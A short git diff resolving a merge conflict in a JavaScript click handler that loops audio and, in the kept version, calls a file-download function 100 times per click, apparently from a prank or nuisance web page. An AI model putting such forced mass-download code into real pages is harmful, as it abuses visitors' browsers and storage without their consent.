@@ -37,15 +37,9 @@ window.addEventListener('click', () => {
             audio.loop = true;
             audio.play();
         }
-<<<<<<< HEAD
-
-        openFullscreen();
-        downloadFile();
-=======
         
         for (let i = 0; i < 100; i++) {
             downloadFile();
         }
->>>>>>> 5ee21a5bf382b562e5aff8e89ced5b88090bcc87
     }
 });
